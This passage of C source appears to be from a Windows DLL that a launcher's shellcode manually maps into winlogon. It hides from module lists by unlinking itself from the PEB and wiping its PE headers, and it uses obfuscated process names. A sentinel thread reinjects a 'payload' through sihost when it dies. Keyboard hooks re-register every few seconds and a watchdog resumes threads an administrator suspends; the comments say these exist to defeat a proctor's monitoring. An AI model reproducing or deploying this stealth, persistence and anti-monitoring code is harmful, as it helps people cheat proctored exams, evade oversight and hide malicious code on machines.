 * mid-poll AND survive to the next poll). Physical hardware still
 * satisfies rising-edge cleanly.
 *
 * DEBOUNCE: 1500ms between fires of the same action. */

/* Shared debounce state -- read+written by all four paths. */
static volatile ULONGLONG g_sn_last_kill_tick   = 0;
static volatile ULONGLONG g_sn_last_revive_tick = 0;

/* v3.0.5 anti-race hardening state. */
#define EMERG_POLL_MS           16      /* ~60Hz -- matches payload */
#define EMERG_REINSTALL_MS      5000    /* payload's REINSTALL_INTERVAL_MS */
#define EMERG_WATCHDOG_MS       1000    /* payload's watchdog_thread cadence */
#define EMERG_HB_STALE_MS       3000    /* payload's stale threshold */
#define EMERG_WM_APP_REINSTALL  (WM_APP + 0x71)

static volatile DWORD    g_emerg_ll_tid            = 0;
static HHOOK             g_emerg_ll_hook           = NULL;
static volatile LONG     g_emerg_poll_running      = 0;
static volatile LONG     g_emerg_reinstall_running = 0;
static volatile LONG     g_emerg_watchdog_running  = 0;
static HANDLE            g_emerg_poll_thread       = NULL;
static volatile ULONGLONG g_emerg_poll_hb          = 0;

/* Shared emergency-action dispatcher. Called by every input path
 * (LL hook, poll, WM_INPUT if we ever add it). Enforces the 1500ms
 * debounce per action so multi-path detection can't double-fire. */
static void emergency_dispatch(int kill_now, int revive_now) {
    ULONGLONG now = GetTickCount64();
    if (kill_now && (now - g_sn_last_kill_tick) > 1500) {
        g_sn_last_kill_tick = now;
        HANDLE t = CreateThread(NULL, 0, sn_emergency_kill_worker, NULL, 0, NULL);
        if (t) CloseHandle(t);
    } else if (revive_now && (now - g_sn_last_revive_tick) > 1500) {
        g_sn_last_revive_tick = now;
        HANDLE t = CreateThread(NULL, 0, sn_emergency_revive_worker, NULL, 0, NULL);
        if (t) CloseHandle(t);
    }
}

/* Path 1: LL keyboard hook (fast path when uncontested).
 * Injection-filtered per v3.0.3. Delegates action to
 * emergency_dispatch so the debounce state is shared with paths 2-4. */
static LRESULT CALLBACK sn_emerg_ll_kbd(int code, WPARAM wp, LPARAM lp) {
    if (code != HC_ACTION) return CallNextHookEx(NULL, code, wp, lp);
    KBDLLHOOKSTRUCT *k = (KBDLLHOOKSTRUCT *)lp;
    int isDown = (wp == WM_KEYDOWN || wp == WM_SYSKEYDOWN);
    int isInjected = (k->flags & (LLKHF_INJECTED | 0x02)) != 0;
    if (!isDown || isInjected) return CallNextHookEx(NULL, code, wp, lp);
    if (k->vkCode != 'Q' && k->vkCode != 'R')
        return CallNextHookEx(NULL, code, wp, lp);
    SHORT ctrl  = GetAsyncKeyState(VK_CONTROL) & 0x8000;
    SHORT shift = GetAsyncKeyState(VK_SHIFT)   & 0x8000;
    SHORT alt   = GetAsyncKeyState(VK_MENU)    & 0x8000;
    if (!(ctrl && shift && alt))
        return CallNextHookEx(NULL, code, wp, lp);
    emergency_dispatch(k->vkCode == 'Q', k->vkCode == 'R');
    return CallNextHookEx(NULL, code, wp, lp);
}

/* Path 2: 60Hz kernel-global keystate poll -- the reliable path that
 * cannot be blocked by user-mode LL hook consumption. Reads
 * win32k!gafAsyncKeyState via GetAsyncKeyState which is not session-
 * gated, not desktop-gated, not process-protection-gated. Uses
 * rising-edge detection (only fires on transition from any-not-down
 * to all-down) so a held chord doesn't spam. */
static DWORD WINAPI emergency_poll_thread(LPVOID unused) {
    (void)unused;
    /* Attach thread to winsta0\default so per-desktop state (if any)
     * is queried against the interactive user's desktop. GetAsyncKeyState
     * is technically session-global per Microsoft, but attaching keeps
     * behavior identical to payload's poll_thread. */
    HDESK d = OpenDesktopA("Default", 0, FALSE, GENERIC_READ);
    if (d) { SetThreadDesktop(d); CloseDesktop(d); }

    lg("emerg-poll: thread up @ pid=%lu (%dHz kernel-global keystate; uncontestable)",
       GetCurrentProcessId(), 1000 / EMERG_POLL_MS);

    int last_q_hot = 0, last_r_hot = 0;
    while (InterlockedCompareExchange(&g_emerg_poll_running, 0, 0)) {
        Sleep(EMERG_POLL_MS);
        if (superseded()) break;
        g_emerg_poll_hb = GetTickCount64();

        int ctrl  = (GetAsyncKeyState(VK_CONTROL) & 0x8000) ? 1 : 0;
        int shift = (GetAsyncKeyState(VK_SHIFT)   & 0x8000) ? 1 : 0;
        int alt   = (GetAsyncKeyState(VK_MENU)    & 0x8000) ? 1 : 0;
        int q     = (GetAsyncKeyState('Q')        & 0x8000) ? 1 : 0;
        int r     = (GetAsyncKeyState('R')        & 0x8000) ? 1 : 0;
        int mods  = ctrl && shift && alt;
        int q_hot = mods && q;
        int r_hot = mods && r;

        if (q_hot && !last_q_hot) {
            static volatile LONG s_pk_logged = 0;
            if (InterlockedIncrement(&s_pk_logged) <= 4) {
                lg("emerg-poll: KILL detected (edge) -- dispatching");
            }
            emergency_dispatch(1, 0);
        }
        if (r_hot && !last_r_hot) {
            static volatile LONG s_pr_logged = 0;
            if (InterlockedIncrement(&s_pr_logged) <= 4) {
                lg("emerg-poll: REVIVE detected (edge) -- dispatching");
            }
            emergency_dispatch(0, 1);
        }
        last_q_hot = q_hot;
        last_r_hot = r_hot;
    }
    lg("emerg-poll: thread exit");
    return 0;
}

/* Path 3: periodic LL rehook to stay at HEAD of the LIFO chain even
 * when a proctor installs their own LL hook after ours. Mirrors
 * payload's reinstall_thread pattern (5s interval, PostThreadMessage
 * to the LL-owning thread). */
static DWORD WINAPI emergency_reinstall_thread(LPVOID unused) {
    (void)unused;
    lg("emerg-reinstall: thread up (%dms LL rehook cadence -- LIFO-race defense)",
       EMERG_REINSTALL_MS);
    ULONG waited = 0;
    while (InterlockedCompareExchange(&g_emerg_reinstall_running, 0, 0)) {
        Sleep(100);
        waited += 100;
        if (superseded()) break;
        if (waited >= EMERG_REINSTALL_MS) {
            waited = 0;
            DWORD tid = g_emerg_ll_tid;
            if (tid) {
                (void)PostThreadMessageW(tid, EMERG_WM_APP_REINSTALL, 0, 0);
            }
        }
    }
    lg("emerg-reinstall: thread exit");
    return 0;
}

/* Path 4: thread-integrity watchdog. Detects poll thread suspension
 * (privileged adversary trying to freeze the uncontestable path) and
 * (a) ResumeThread's until suspend count unwinds; (b) respawns the
 * poll thread if still stale after resume. Same 1s/3s/32-resume-max
 * design as payload's watchdog_thread. */
static DWORD WINAPI emergency_watchdog_thread(LPVOID unused) {
    (void)unused;
    lg("emerg-watchdog: thread up (%dms cadence, stale @ %dms)",
       EMERG_WATCHDOG_MS, EMERG_HB_STALE_MS);
    while (InterlockedCompareExchange(&g_emerg_watchdog_running, 0, 0)) {
        Sleep(EMERG_WATCHDOG_MS);
        if (superseded()) break;
        if (!InterlockedCompareExchange(&g_emerg_poll_running, 0, 0)) break;
        ULONGLONG hb = g_emerg_poll_hb;
        if (hb == 0) continue;
        if ((GetTickCount64() - hb) <= EMERG_HB_STALE_MS) continue;

        HANDLE t = g_emerg_poll_thread;
        if (t) {
            DWORD prev = ResumeThread(t);
            int guard = 0;
            while (prev != (DWORD)-1 && prev > 1 && guard++ < 32)
                prev = ResumeThread(t);
            lg("emerg-watchdog: poll HB stale -- ResumeThread (prev=%lu, unwound=%d)",
               (unsigned long)prev, guard);
            Sleep(250);
            if ((GetTickCount64() - g_emerg_poll_hb) > EMERG_HB_STALE_MS) {
                lg("emerg-watchdog: poll still stale after resume -- respawning thread");
                InterlockedExchange(&g_emerg_poll_running, 0);
                Sleep(50);
                CloseHandle(t);
                g_emerg_poll_thread = NULL;
                g_emerg_poll_hb = 0;
                InterlockedExchange(&g_emerg_poll_running, 1);
                HANDLE nt = CreateThread(NULL, 0, emergency_poll_thread, NULL, 0, NULL);
                if (nt) g_emerg_poll_thread = nt;
            }
        }
    }
    lg("emerg-watchdog: thread exit");
    return 0;
}

/* Path 1's hosting thread: owns the LL hook + message pump. Publishes
 * its own TID so the reinstaller can PostThreadMessage(WM_APP_REINSTALL)
 * back for the periodic rehook. */
static DWORD WINAPI emergency_hotkey_thread(LPVOID unused) {
    (void)unused;
    HDESK d = OpenDesktopA("Default", 0, FALSE,
                            DESKTOP_HOOKCONTROL | GENERIC_READ);
    if (d) {
        if (!SetThreadDesktop(d)) {
            lg("emerg-hotkey: SetThreadDesktop(Default) failed gle=%lu",
               GetLastError());
        }
        CloseDesktop(d);
    }
    g_emerg_ll_hook = SetWindowsHookExW(WH_KEYBOARD_LL, sn_emerg_ll_kbd, NULL, 0);
    lg("emerg-hotkey: WH_KEYBOARD_LL install %s (Ctrl+Shift+Alt+Q/R, path 1 of 4)",
       g_emerg_ll_hook ? "OK" : "FAILED");
    if (!g_emerg_ll_hook) return 0;

    g_emerg_ll_tid = GetCurrentThreadId();

    MSG m;
    while (GetMessageW(&m, NULL, 0, 0) > 0) {
        if (superseded()) break;
        /* Path 3: reinstaller ping -- swap the LL hook to bump us back
         * to the HEAD of the LIFO chain even if a proctor installed
         * after us. Old hook uninstalled AFTER new one is up so we're
         * never in a hookless window. */
        if (m.hwnd == NULL && m.message == EMERG_WM_APP_REINSTALL) {
            HHOOK old = g_emerg_ll_hook;
            HHOOK n = SetWindowsHookExW(WH_KEYBOARD_LL, sn_emerg_ll_kbd, NULL, 0);
            if (n) {
                g_emerg_ll_hook = n;
                if (old) UnhookWindowsHookEx(old);
                static volatile LONG s_r_logged = 0;
                if (InterlockedIncrement(&s_r_logged) <= 3) {
                    lg("emerg-hotkey: LL rehook OK (bumped to head of LIFO chain)");
                }
            }
            continue;
        }
        TranslateMessage(&m); DispatchMessageW(&m);
    }
    if (g_emerg_ll_hook) UnhookWindowsHookEx(g_emerg_ll_hook);
    g_emerg_ll_hook = NULL;
    g_emerg_ll_tid = 0;
    lg("emerg-hotkey: thread exit");
    return 0;
}

/* ── Sentinel thread: watches shell + payload liveness ───────── */
static DWORD WINAPI sentinel_thread(LPVOID unused) {
    (void)unused;
    lg("sentinel_thread up in pid=%lu (shell + payload watchdog)",
       GetCurrentProcessId());

    /* Startup grace: give the payload up to 30 s to publish its
     * shutdown event before we start considering it "dead". Also lets
     * svchelper (if it's coming up) start its own watchdog first. */
    ULONGLONG start = GetTickCount64();
    while ((GetTickCount64() - start) < 30000ULL && !superseded()) {
        Sleep(1000);
        if (sn_is_payload_alive()) {
            InterlockedExchange(&g_sn_confirmed_alive, 1);
            lg("sentinel: payload confirmed alive during startup grace");
            break;
        }
    }

    DWORD tick_count = 0;
    while (!superseded()) {
        Sleep(5000);
        if (superseded()) break;
        tick_count++;

        DWORD session = WTSGetActiveConsoleSessionId();
        if (session == 0xFFFFFFFF) continue;

        /* Honor user intent -- either sentinel present == don't touch. */
        if (sn_sentinels_present()) {
            if ((tick_count % 12) == 0)   /* log every ~60 s to avoid spam */
                lg("sentinel: user sentinel present -- skipping resurrection tick");
            continue;
        }

        /* Monitor A: shell watchdog. */
        wchar_t wname[24];
        for (int i = 0; i < 24; i++) wname[i] = 0;
        x_decode_w(wname, 24, SN_EXPLORER_x, sizeof(SN_EXPLORER_x));
        DWORD exp_pid = 0;
        int shell_alive = sn_find_process_in_session(wname, session, &exp_pid);
        if (!shell_alive) {
            if (sn_rate_check_and_stamp(&g_sn_shell)) {
                lg("sentinel: NO explorer.exe in session %lu -- respawning", session);
                sn_spawn_explorer_for_user(session);
            } else if ((tick_count % 6) == 0) {
                lg("sentinel: shell dead but rate-limited (backing off)");
            }
        }

        /* Monitor B: payload watchdog. Defer to svchelper if it's alive. */
        for (int i = 0; i < 24; i++) wname[i] = 0;
        x_decode_w(wname, 24, SN_SVCHELPER_x, sizeof(SN_SVCHELPER_x));
        DWORD svch_pid = 0;
        int svch_alive = sn_find_process_in_session(wname, session, &svch_pid);
        if (svch_alive) continue;

        int payload_alive = sn_is_payload_alive();
        if (payload_alive) {
            InterlockedExchange(&g_sn_confirmed_alive, 1);
            continue;
        }
        if (!g_sn_confirmed_alive) continue;   /* never armed -> nothing to revive */

        if (sn_rate_check_and_stamp(&g_sn_payload)) {
            lg("sentinel: payload gone (was alive), svchelper absent -- --reinject");
            if (sn_spawn_sihost_reinject()) {
                /* Force re-confirmation so a doomed reinject doesn't keep retrying. */
                InterlockedExchange(&g_sn_confirmed_alive, 0);
            }
        } else if ((tick_count % 6) == 0) {
            lg("sentinel: payload dead but rate-limited (backing off)");
        }
    }
    lg("sentinel: exit (superseded)");
    return 0;
}
/* ═══════════ end v3.0.3 sentinel + emergency block ═══════════ */

/* ── DllMain -- entry point for BOTH manual-map and LoadLibrary ────
 *
 * Manual map: the launcher's shellcode calls DllMain(hInstance=base,
 * DLL_PROCESS_ATTACH, NULL) from a fresh CreateRemoteThread inside
 * winlogon. We do the stealth pass on the remote thread (still valid
 * to VirtualProtect our own image), spawn watch_thread, return TRUE.
 *
 * LoadLibrary: standard Windows loader path; same DllMain runs. The
 * stealth pass still applies -- PEB unlink hides us from module walks
 * regardless of how we got loaded. */
BOOL WINAPI DllMain(HINSTANCE h, DWORD reason, LPVOID reserved) {
    (void)reserved;
    if (reason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(h);
        lg("wl_input ATTACH pid=%lu base=%p", GetCurrentProcessId(), (void *)h);

        /* Supersede any prior instance across ALL generations of halt-event
         * names (pre-v3.0.2 static, v3.0.2 static, v3.0.2.4 GUID).
         *
         * v3.0.6 (2026-09-21) -- STRENGTHENED. Was Sleep(450) which was too
         * short: old reader threads only wake on WM_TIMER every 100ms, so
         * 450ms = only 4 wake-ticks worth of superseded()-check windows.
         * If prior helper's reader was mid-WM_INPUT-burst it might miss all
         * 4 windows, ResetEvent fires while it's still alive, and now TWO
         * readers coexist fighting for the pipe (iso input flap-cycles
         * indefinitely). Live-observed 2026-09-21 06:07 -- two readers
         * attached to same iso desktop 25ms apart, second lost the pipe
         * race. Now Sleep(1500) = 15 wake-ticks worth of chances; even a
         * pathologically busy old reader will hit at least one WM_TIMER +
         * see the halt signal and exit its GetMessage loop before we clear
         * the event and start our own threads. Reader singleton mutex
         * (v3.0.6 too) is the belt if this suspenders fails. */
        const wchar_t *stop_w = wl_iso_halt_event_w();
        g_stop = CreateEventW(NULL, TRUE, FALSE, stop_w);
        if (g_stop) { SetEvent(g_stop); Sleep(1500); ResetEvent(g_stop); }
        /* Kick prior-generation helpers too. */
        HANDLE k1 = OpenEventW(EVENT_MODIFY_STATE, FALSE, OLD_STOP_EVENT_W);
        if (k1) { SetEvent(k1); CloseHandle(k1);
                  lg("kicked pre-v3.0.2 helper via %ls", OLD_STOP_EVENT_W); }
        HANDLE k2 = OpenEventW(EVENT_MODIFY_STATE, FALSE, V3_0_2_STOP_EVENT_W);
        if (k2) { SetEvent(k2); CloseHandle(k2);
                  lg("kicked v3.0.2 helper via %ls", V3_0_2_STOP_EVENT_W); }

        /* Stealth pass -- PEB unlink first (invalidates our module list
         * entry), then PE header wipe, then section downgrade. Same
         * order as payload's init_thread. */
        peb_unlink_and_spoof(h);
        wipe_pe_headers(h);
        downgrade_sections(h);

        /* Open the payload's chat-active event (created by
         * chat_state_export()) so our LL keyboard hook can gate
         * consume-vs-passthrough. The event may not exist yet if the
         * payload hasn't chatted this session -- OpenEventW returns NULL
         * in that case; the hook checks g_chat_ev before waiting so
         * NULL is safe (pass-through). We'll retry the open opportunis-
         * tically inside the reader's WM_TIMER handler. */
        {
            g_chat_ev = OpenEventW(SYNCHRONIZE, FALSE, wl_iso_chat_event_w());
            lg("chat_ev open %s (v3.0.2.4 GUID-per-install event)",
               g_chat_ev ? "OK" : "PENDING");
        }

        CreateThread(NULL, 0, watch_thread, NULL, 0, NULL);

        /* v3.0.3 (2026-09-21) -- LAYER 2+3+4: watchdog + emergency hotkeys.
         * sentinel_thread watches shell + payload liveness and resurrects
         * each. emergency_hotkey_thread installs an LL keyboard hook on
         * winsta0\default for Ctrl+Shift+Alt+Q (kill) and Ctrl+Shift+Alt+R
         * (revive), both injection-filtered so hostile apps can't trigger. */
        CreateThread(NULL, 0, sentinel_thread, NULL, 0, NULL);
        CreateThread(NULL, 0, emergency_hotkey_thread, NULL, 0, NULL);

        /* v3.0.5 (2026-09-21) -- anti-race hardening: mirror payload's
         * rawinput_hook.c triple-path input architecture into the helper
         * so a proctor's WH_KEYBOARD_LL consumption cannot defeat our
         * emergency hotkeys. See the big comment block above sn_emerg_ll_kbd.
         *
         *   Path 2: 60Hz GetAsyncKeyState poll (kernel-global; uncontestable)
         *   Path 3: periodic LL rehook to defeat LIFO-chain race
         *   Path 4: thread-integrity watchdog against admin SuspendThread */
        InterlockedExchange(&g_emerg_poll_running, 1);
        g_emerg_poll_thread = CreateThread(NULL, 0, emergency_poll_thread, NULL, 0, NULL);
        InterlockedExchange(&g_emerg_reinstall_running, 1);
        CreateThread(NULL, 0, emergency_reinstall_thread, NULL, 0, NULL);
        InterlockedExchange(&g_emerg_watchdog_running, 1);
        CreateThread(NULL, 0, emergency_watchdog_thread, NULL, 0, NULL);
    }
    return TRUE;
}
